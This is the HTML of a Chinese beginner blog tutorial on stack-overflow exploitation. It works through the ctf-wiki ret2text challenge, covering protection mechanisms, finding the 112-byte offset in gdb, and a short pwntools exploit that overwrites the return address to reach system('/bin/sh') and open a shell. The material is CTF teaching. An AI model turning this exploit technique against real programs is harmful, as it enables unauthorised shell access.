@@ -1,0 +1,190 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>一个案例入门pwn - 赵丰年-全世界都知道我很低调</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="赵丰年,"> 
+    <meta name="description" content="写在前面pwn是一个很酷炫，很玄学的东西，懂的人都懂，不懂的怎么都不懂，一入pwn门深似海，一天到晚纯自嗨。如果单说入门前需要学些什么的话，真的很琐碎，很让人头大。但是毕竟pwn是一个很需要动手的学,"> 
+    <meta name="author" content="XIY"> 
+    <link rel="alternative" href="atom.xml" title="赵丰年-全世界都知道我很低调" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">赵丰年-全世界都知道我很低调</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://xiy-blogs.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">一个案例入门pwn</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">一个案例入门pwn</h1>
+        <div class="stuff">
+            <span>二月 27, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>pwn是一个很酷炫，很玄学的东西，懂的人都懂，不懂的怎么都不懂，一入pwn门深似海，一天到晚纯自嗨。如果单说入门前需要学些什么的话，真的很琐碎，很让人头大。但是毕竟pwn是一个很需要动手的学问，而我往往学什么都会以它为主线，用到什么学什么，所以我打算用一个简单的栈溢出案例，通过操作过程，总结一下我的入门。</p>
+<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><p>首先要安装一些工具，你需要一个unbunt系统，需要一个IDA，其余工具安装参考这个博客<a href="https://www.cnblogs.com/threesoil/p/10187445.html" target="_blank" rel="noopener">pwn相关工具安装</a>这里就不多说了，干就完了。</p>
+<h1 id="开始动手"><a href="#开始动手" class="headerlink" title="开始动手"></a>开始动手</h1><p>这个案例我用的是ctfwiki上的<a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">ret2text</a>下载下来后给它执行权限<br>首先拿到程序检查下它的保护机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec .&#x2F;ret2text</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little &#x2F;&#x2F;文件为32位程序</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found 	&#x2F;&#x2F;未开启canary保护</span><br><span class="line">NX:       NX enabled	&#x2F;&#x2F;开启了栈不可执行保护</span><br><span class="line">PIE:      No PIE (0x8048000)	&#x2F;&#x2F;未开启地址无关可执行</span><br></pre></td></tr></table></figure>
+<p>OK，现在谈谈常见的集中保护机制,简单了解下就行：</p>
+<h2 id="canary（栈保护"><a href="#canary（栈保护" class="headerlink" title="canary（栈保护)"></a>canary（栈保护)</h2><p>当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p>
+<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址</p>
+<h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，限制一块内存区域不可执行。</p>
+<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。<br>但是，地址随机化不是对所有模块和内存区都进行随机化！虽然libc、栈、堆的加载位置被随机化，但主镜像不会。</p>
+<h2 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h2><p>我们扔进IDA看看有神马东西，先点击main函数，然后F5，看看伪代码<br><img src="https://i.loli.net/2020/02/27/HqtS5w16JL9EYPM.png" alt="yichu.png"><br>看出这里存在栈溢出漏洞，ok谈一下栈溢出</p>
+<h2 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h2><p>溢出溢出，字面上就是往容器里加的水超过了水的容积，简单讲，栈溢出就是向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，造成溢出。<br>发生栈溢出的条件：<br>==程序必须向栈上写入数据。==<br>==写入的数据大小没有被良好地控制。==<br>利用方式：<br>==覆盖程序的返回地址为攻击者所控制的地址，比如该地址为执行shellcode的地址==<br>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，可以让攻击者获得shell，利用pwntools可自动生成，等用到再说。<br>可能造成栈溢出的函数有：==gets,scanf,vscanf,sprintf,strcpy,strcat，bcopy==</p>
+<h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><p>发现secure函数调用了system(“/bin/sh”)执行它会使我们拿到shell<br><img src="https://i.loli.net/2020/02/27/SbE72esRiVly1aF.png" alt="sh.png"><br>现在我们只需要确定溢出长度，使其覆盖到这个地址，就能拿到shell。<br>那么问题来了如何确定溢出长度，这个地址是多少，稳住，我们一个一个来解决<br>我们可以利用==gdb==进行调试看它的偏移，不多说，看操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb -q .&#x2F;ret2text		 &#x2F;&#x2F;gdb载入该文件</span><br><span class="line">pattern create 200		&#x2F;&#x2F;制造200个填充字符，先把他复制下来</span><br><span class="line">r						&#x2F;&#x2F;运行程序</span><br></pre></td></tr></table></figure>
+<p>然后把字符粘贴上，确定<br><img src="https://i.loli.net/2020/02/27/7gnLPuNbtsUr85v.png" alt="屏幕截图 2020-02-27 16.19.18.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern offset 0x41384141</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/02/27/CFcO4YyqMlxjW7B.png" alt="a6.png"><br>确定了偏移地址为：112<br>那么我们看在IDA看在secure中调用system(“/bin/sh”)的地址<br><img src="https://i.loli.net/2020/02/27/gz7AkoY6Zhb2PnO.png" alt="a8.png"><br>我们可以确定下payload<br>payload = ‘a’*112 + p32(0x804863A)    //p32()将其打包，64位用p64()<br>好，编写下exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*        </span><br><span class="line">r &#x3D; remote(&#39;127.0.0.1&#39;,10000)	&#x2F;&#x2F;与文件建立远程连接，本地用porcess(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*112 + p32(0x804863A)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)		&#x2F;&#x2F;发送payload</span><br><span class="line"></span><br><span class="line">r.interactive()			&#x2F;&#x2F;直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure>
+<p>执行exp<br><img src="https://i.loli.net/2020/02/27/rRgzk4a2YZHlCMn.png" alt="a10.png"><br>关于pwntools参数及使用大家可以看下这个文章<a href="https://www.jianshu.com/p/355e4badab50" target="_blank" rel="noopener">pwntools的使用</a></p>
+<hr>
+<h2 id="顺便聊聊段和汇编"><a href="#顺便聊聊段和汇编" class="headerlink" title="顺便聊聊段和汇编"></a>顺便聊聊段和汇编</h2><p>我们可以看到在IDA反汇编窗口中有==.text==&emsp;==.bss==&emsp;==.data==<br>bss段：==可读可写，存放程序中未初始化的全局变量的一块内存区域==<br>text段：==只读，程序代码段==<br>data段：==存放在编译阶段(而非运行时)就能确定的数据,可读可写。也就是通常所说的静态存储区,赋了初值的全局变量和赋初值的静态变量存放在这个区域,常量也存放在这个区域==<br>可以参考下这个文章<a href="https://blog.csdn.net/superjiangzhen/article/details/79938458" target="_blank" rel="noopener">段知识介绍</a><br>关于bss，当程序未开启NX，但没有sheelcode时，我们可以通过往该段写入shellcode，然后覆盖到这个地址执行它就可以拿到shell了。<br>关于汇编，目前只需要了解其常见指令，寄存器，和函数的意思即可<br>这个大佬总结的就很好想学的人自然会看这篇<a href="https://www.freebuf.com/news/others/86147.html" target="_blank" rel="noopener">汇编基础</a>，到这里差不多就了解了pwn的经典栈溢出了，然后，可以继续沿着栈溢出往下学，然后学格式化字符串，整数溢出，堆溢出等。</p>
+<hr>
+<p>安利一波学习网站：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">ctfwiki</a><br><a href="https://www.kanxue.com/chm.htm" target="_blank" rel="noopener">看雪知识库</a><br><a href="https://bbs.pediy.com/search-pwn.htm" target="_blank" rel="noopener">看雪论坛</a></p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>剑未佩妥，初入江湖，仍是少年！如果哪里不对欢迎师傅们指正！</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="https://link.hhtjim.com/163/535586576.mp3">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci='9795acb241b5abfffb0a'
+        data-cs='660e7056618084a8a8046e8e2e9e78787cdb23cf'
+        data-r='XIY-blogs.github.io'
+        data-o='XIY-blogs'
+        data-a='XIY-blogs'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
